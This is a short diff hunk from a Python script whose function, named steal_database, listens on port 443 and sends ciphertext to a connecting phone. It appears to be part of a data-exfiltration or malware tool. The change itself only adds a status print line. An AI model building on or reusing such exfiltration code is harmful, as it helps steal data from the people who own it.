@@ -22,6 +22,7 @@ def steal_database():
     s.bind(('', port))
     s.listen(1)
     print("Listening on port 443 for a connection from the phone")
+    print('All parts are now running and the phone can now connect')
     conn, addr = s.accept()
     print('Got connection from: ', addr)
     conn.send(ciphertext)
